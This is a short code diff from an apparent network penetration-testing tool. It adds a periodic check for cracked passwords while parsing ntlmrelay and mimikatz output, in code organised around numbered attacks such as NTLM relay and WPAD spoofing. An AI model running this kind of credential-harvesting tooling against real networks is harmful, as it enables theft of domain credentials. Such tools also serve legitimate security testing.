@@ -1092,11 +1092,17 @@ def do_ntlmrelay(prev_creds, args, iface):
     file_lines = follow_file(ntlmrelay_file)
 
     successful_auth = False
+    counter = 0
     for line in file_lines:
         # Parse ntlmrelay output
         prev_creds, successful_auth = parse_ntlmrelay_line(line, successful_auth, prev_creds, args)
         # Parse mimikatz output
         prev_creds, mimi_data = parse_mimikatz(prev_creds, mimi_data, line)
+
+        # for every other line of ntlmrelay output, check for cracked passwords
+        counter = counter + 1
+        if counter % 3 == 0:
+            prev_creds = get_cracked_pwds(prev_creds)
 
 def check_for_nse_scripts(hosts):
     '''
@@ -1308,6 +1314,7 @@ def main(report, args):
             prev_creds = cleanup_responder(resp_proc, prev_creds)
             # Give responder some time to die with dignity
             time.sleep(2)
+
 
     # ATTACK 4: NTLM relay
     # ATTACK 5: IPv6 DNS WPAD spoof
